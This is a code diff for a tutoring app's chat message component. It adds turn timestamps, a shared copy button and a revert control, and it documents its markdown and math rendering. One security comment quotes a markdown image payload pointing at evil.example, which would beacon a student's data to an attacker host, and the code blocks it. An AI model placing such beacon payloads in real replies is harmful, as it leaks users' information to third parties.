@@ -17,7 +17,7 @@
    'system'  — Centered, very small, muted, mono small-caps.
                E.g. "· submitted at 11:34 ·"
 
-   #327: this file also owns MARKDOWN + MATH rendering for the tutor's turns.
+   #397: this file also owns MARKDOWN + MATH rendering for the tutor's turns.
    Before this, nothing on the message surface parsed anything: a reply
    containing "\n\n" collapsed into one run-on paragraph, a "# Sample Spaces"
    heading rendered as a literal "#", and LaTeX leaked raw into the transcript
@@ -53,7 +53,7 @@ import rehypeKatex, { type Options as RehypeKatexOptions } from "rehype-katex";
    the font url()s into the app's own /assets, so nothing reaches a CDN at
    runtime (Cloudflare Workers today, AWS later). Any future app that renders
    a transcript must add the same import to its entry. */
-import { Copy, Check, WarningCircle } from "@phosphor-icons/react";
+import { Copy, Check, WarningCircle, ArrowCounterClockwise } from "@phosphor-icons/react";
 import { CodeBlock } from "./CodeBlock";
 import {
   CodeExecution,
@@ -65,7 +65,7 @@ import {
    Markdown + math rendering
 
    WHY react-markdown rather than a hand-rolled renderer (the two options
-   weighed for #327):
+   weighed for #397):
 
    1. It is already the house tool. apps/admin renders instructor-authored
       section content with `react-markdown` + `remark-gfm` (see
@@ -111,7 +111,7 @@ import {
       usual way people accidentally disable it. The `a` override below only
       adds rel/target; it never widens what is allowed.
 
-   d) #327 review finding 5: `![x](https://evil.example/t.png?u=alice)` in a
+   d) #397 review finding 5: `![x](https://evil.example/t.png?u=alice)` in a
       reply used to render a real <img src>, which FETCHES on render -- a
       zero-click beacon that leaks the student's IP, user-agent and the fact
       they were reading that homework, to an attacker-chosen host, and there
@@ -135,7 +135,7 @@ import {
 
    The FIRST attempt at this rewrote the delimiters in the markdown SOURCE
    STRING before parsing: `\(x\)` -> `$x$`, `\[x\]` -> `\n\n$$\nx\n$$\n\n`.
-   The #327 review proved four separate defects, all of them consequences of
+   The #397 review proved four separate defects, all of them consequences of
    that one decision, and all of them dissolved by moving the conversion into
    the tree instead:
 
@@ -423,7 +423,7 @@ function splitLatexMath(node: MdastNode, source: string, allowDisplay: boolean):
 /** A paragraph that now contains block-level math is split into a run of
  *  paragraphs and math nodes, in the paragraph's own parent. Note what this
  *  does NOT do: it never touches the grandparent, so the list item or
- *  blockquote holding the paragraph survives intact (#327 finding 3). */
+ *  blockquote holding the paragraph survives intact (#397 finding 3). */
 function liftDisplayMath(paragraph: MdastNode): MdastNode[] {
   const children = paragraph.children ?? [];
   if (!children.some((child) => child.type === "math")) return [paragraph];
@@ -457,7 +457,7 @@ function liftDisplayMath(paragraph: MdastNode): MdastNode[] {
   return out.length > 0 ? out : [paragraph];
 }
 
-/** #327 finding 10: remark-math's flow math closes at END OF INPUT, exactly
+/** #397 finding 10: remark-math's flow math closes at END OF INPUT, exactly
  *  like a code fence. Mid-stream that means every single token of a `$$`
  *  formula produces a `math` node holding a half-typed expression, KaTeX
  *  fails to parse it, and the student watches a red "KaTeX parse error"
@@ -468,7 +468,7 @@ function liftDisplayMath(paragraph: MdastNode): MdastNode[] {
  *  formula is not an ERROR, it is an INCOMPLETE one, so rendering any error
  *  node for it is wrong at any hue; a muted one still redraws a distinct
  *  error element per token. Handing the raw source back as plain text is
- *  quiet, is what the pre-#327 transcript showed anyway, and flips to real
+ *  quiet, is what the pre-#397 transcript showed anyway, and flips to real
  *  typeset math the instant the closing fence arrives. errorColor stays red
  *  for genuinely CLOSED but malformed TeX, where the signal is true. */
 function isUnterminatedMath(node: MdastNode, source: string): boolean {
@@ -614,7 +614,7 @@ const MARKDOWN_COMPONENTS: Components = {
       {children}
     </a>
   ),
-  /* #327 finding 5 -- see SECURITY (d). An <img src> from a model reply is a
+  /* #397 finding 5 -- see SECURITY (d). An <img src> from a model reply is a
      zero-click beacon, so the URL never reaches the DOM at all; the alt text
      is rendered in its place so nothing disappears without a trace. */
   img: ({ alt }) => {
@@ -623,7 +623,7 @@ const MARKDOWN_COMPONENTS: Components = {
   },
 };
 
-/* #327 finding 2: `singleDollarTextMath: false` -- a LONE `$` in prose is
+/* #397 finding 2: `singleDollarTextMath: false` -- a LONE `$` in prose is
    never math. "If the payout is $10 with probability 0.5 and $0 otherwise"
    used to typeset "10 with probability 0.5 and " as an equation, and a
    statistics tutor talks about money constantly. `$$...$$` is unaffected.
@@ -790,6 +790,10 @@ export type MessageRole = "ai" | "student" | "system";
 export interface AIMessageProps {
   role: "ai";
   isStreaming?: boolean;
+  /** ISO 8601, straight from the message row's `createdAt`. Omitted for a
+   *  turn that has not been persisted yet (a live stream), in which case no
+   *  time is rendered rather than a fabricated one. */
+  createdAt?: string;
   children: React.ReactNode;
 }
 
@@ -800,6 +804,13 @@ export interface StudentMessageProps {
    *  markdown text with no separate R-mode message shape. Omitted, the fence
    *  renders read-only. */
   onRun?: (code: string) => Promise<RCodeResult>;
+  /** ISO 8601 -- see AIMessageProps.createdAt. */
+  createdAt?: string;
+  /** "Revert the conversation to this message." Renders the affordance ONLY
+   *  when a handler is supplied: a visible control that cannot act is worse
+   *  than an absent one, and the endpoint this needs does not exist yet (see
+   *  the note in ConversationView's onRevertToMessage). */
+  onRevert?: () => void;
   children: React.ReactNode;
 }
 
@@ -836,8 +847,35 @@ const COPY_GLYPH: Record<CopyState, typeof Copy> = {
   failed: WarningCircle,
 };
 
-function AIMessage({ isStreaming = false, children }: Omit<AIMessageProps, "role">) {
-  const source = collectTurnSource(children);
+/** Absolute clock time, not "3 minutes ago". A tutoring session is one
+ *  sitting, so wall-clock is what a student can correlate with what they
+ *  remember doing; a relative label would also need a ticking re-render on a
+ *  surface that already re-renders per streamed token. Matches the house
+ *  system-message register ("submitted at 11:34"). */
+function formatTurnTime(iso: string): string {
+  const d = new Date(iso);
+  if (Number.isNaN(d.getTime())) return "";
+  return d.toLocaleTimeString(undefined, { hour: "numeric", minute: "2-digit" });
+}
+
+function TurnTime({ createdAt }: { createdAt?: string }) {
+  if (!createdAt) return null;
+  const label = formatTurnTime(createdAt);
+  if (label === "") return null;
+  /* <time> rather than a span: the machine-readable datetime is the honest
+     element, and it costs nothing. */
+  return (
+    <time className="message__time" dateTime={createdAt}>
+      {label}
+    </time>
+  );
+}
+
+/** The copy control, shared by both speakers. `subject` only shapes the
+ *  accessible name -- "the tutor's message" vs "your message" -- so a
+ *  screen-reader user landing on one of several copy buttons in a transcript
+ *  knows which turn they are on. */
+function CopyButton({ source, subject }: { source: string; subject: string }) {
   const [copyState, setCopyState] = useState<CopyState>("idle");
   const resetTimer = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
 
@@ -861,6 +899,56 @@ function AIMessage({ isStreaming = false, children }: Omit<AIMessageProps, "role
     clearTimeout(resetTimer.current);
     resetTimer.current = setTimeout(() => setCopyState("idle"), COPY_FEEDBACK_MS);
   }, [source]);
+
+  const Glyph = COPY_GLYPH[copyState];
+
+  return (
+    <>
+      <button
+        type="button"
+        className={`message__action message__copy${
+          copyState === "idle" ? "" : ` message__copy--${copyState}`
+        }`}
+        onClick={handleCopy}
+        /* Stable across all three states, so a voice-control user's "click
+           Copy the tutor's message" keeps working while the glyph changes;
+           the transient wording goes to the live region below.
+
+           #397 review finding 8 noted the earlier text-label version was a
+           considered trade AGAINST WCAG 2.5.3 (for 1.8s the visible label
+           read "Copied", which the name did not contain). Now that the
+           control is icon-only there is no visible label, so 2.5.3 -- which
+           binds only when one exists -- does not apply, and the conflict is
+           gone rather than traded away. */
+        aria-label={`Copy ${subject}`}
+      >
+        {/* Keyed on the state so React MOUNTS a new element per transition
+            rather than reusing one: that is what lets the CSS entry animation
+            replay on every copy instead of firing once per page. The swap
+            reads as the same button turning over to show its new face. */}
+        <Glyph key={copyState} size={15} weight="regular" aria-hidden="true" />
+      </button>
+      {/* aria-live WITHOUT role="status" on purpose: role="status" here would
+          be a second one inside the same turn (the streaming dots carry one)
+          and would collide with ConversationView's own single-status
+          assertions. The live region alone does the announcing. */}
+      <span className="sr-only" aria-live="polite">
+        {copyState === "copied"
+          ? "Message copied to clipboard."
+          : copyState === "failed"
+            ? "Couldn't copy the message. Select the text and copy it manually."
+            : ""}
+      </span>
+    </>
+  );
+}
+
+function AIMessage({
+  isStreaming = false,
+  createdAt,
+  children,
+}: Omit<AIMessageProps, "role">) {
+  const source = collectTurnSource(children);
 
   return (
     // #300: aria-busy so the log region below (ConversationView's
@@ -892,56 +980,25 @@ function AIMessage({ isStreaming = false, children }: Omit<AIMessageProps, "role
         )}
       </div>
 
-      {/* #327: per-turn actions. The row is rendered (and its height reserved
-          in CSS) for every turn that HAS copyable text, including while that
-          text is still streaming -- revealing the button on hover/focus is
-          then a pure opacity change and cannot reflow a transcript the
-          student is reading. The button sits below the turn, in space the
-          turn's own bottom margin already occupied, so it never covers a
+      {/* #397: per-turn meta row -- copy, then the time. The row is rendered
+          (and its height reserved in CSS) for every turn that HAS copyable
+          text, including while that text is still streaming, so revealing the
+          controls on hover/focus is a pure opacity change and cannot reflow a
+          transcript the student is reading. It sits below the turn, in space
+          the turn's own bottom margin already occupied, so it never covers a
           word of the answer.
 
-          It stays in the tab order at all times (opacity: 0 is still
+          Controls stay in the tab order at all times (opacity: 0 is still
           focusable) rather than being mounted on hover, which is what makes
-          it reachable without a pointer; styles.css reveals it on
-          :focus-within for the same reason. */}
-      {source !== "" && (
+          them reachable without a pointer; styles.css reveals them on
+          :focus-within for the same reason. The TIME is not hidden with them:
+          it is information, not an affordance, so it stays legible at rest. */}
+      {(source !== "" || createdAt) && (
         <div className="message__actions">
-          <button
-            type="button"
-            className={`message__copy${copyState === "idle" ? "" : ` message__copy--${copyState}`}`}
-            onClick={handleCopy}
-            /* Stable across all three states, so a voice-control user's
-               "click Copy the tutor's message" keeps working while the glyph
-               changes; the transient wording goes to the live region below.
-
-               #327 review finding 8 noted the earlier text-label version was
-               a considered trade AGAINST WCAG 2.5.3 (for 1.8s the visible
-               label read "Copied", which the name did not contain). Now that
-               the control is icon-only there is no visible label, so 2.5.3 --
-               which binds only when one exists -- does not apply, and the
-               conflict is gone rather than traded away. */
-            aria-label="Copy the tutor's message"
-            /* Hidden mid-stream: the text is still growing, so a copy taken
-               then is a half-answer. The ROW stays, so nothing moves. */
-            hidden={isStreaming}
-          >
-            {(() => {
-              const Glyph = COPY_GLYPH[copyState];
-              return <Glyph size={15} weight="regular" aria-hidden="true" />;
-            })()}
-          </button>
-          {/* aria-live WITHOUT role="status" on purpose: role="status" here
-              would be a second one inside the same turn (the streaming dots
-              above already carry it) and would collide with
-              ConversationView's own single-status assertions. The live
-              region alone is what does the announcing. */}
-          <span className="sr-only" aria-live="polite">
-            {copyState === "copied"
-              ? "Message copied to clipboard."
-              : copyState === "failed"
-                ? "Couldn't copy the message. Select the text and copy it manually."
-                : ""}
-          </span>
+          {source !== "" && !isStreaming && (
+            <CopyButton source={source} subject="the tutor's message" />
+          )}
+          <TurnTime createdAt={createdAt} />
         </div>
       )}
     </div>
@@ -978,7 +1035,11 @@ function renderStudentBody(text: ReactNode, onRun?: (code: string) => Promise<RC
 
 export function Message(props: MessageProps) {
   if (props.role === "ai") {
-    return <AIMessage isStreaming={props.isStreaming}>{props.children}</AIMessage>;
+    return (
+      <AIMessage isStreaming={props.isStreaming} createdAt={props.createdAt}>
+        {props.children}
+      </AIMessage>
+    );
   }
 
   if (props.role === "student") {
@@ -993,6 +1054,27 @@ export function Message(props: MessageProps) {
         <div className="message__student-bubble">
           {renderStudentBody(props.children, props.onRun)}
         </div>
+        {/* Mirror of the tutor's row, reversed: the student's turn is
+            right-aligned, so its meta reads time-first and the controls sit
+            nearest the bubble's edge, which is where the eye already is. */}
+        {(props.createdAt || props.onRevert || typeof props.children === "string") && (
+          <div className="message__actions message__actions--student">
+            <TurnTime createdAt={props.createdAt} />
+            {props.onRevert && (
+              <button
+                type="button"
+                className="message__action message__revert"
+                onClick={props.onRevert}
+                aria-label="Revert the conversation to this message"
+              >
+                <ArrowCounterClockwise size={15} weight="regular" aria-hidden="true" />
+              </button>
+            )}
+            {typeof props.children === "string" && props.children !== "" && (
+              <CopyButton source={props.children} subject="your message" />
+            )}
+          </div>
+        )}
       </div>
     );
   }
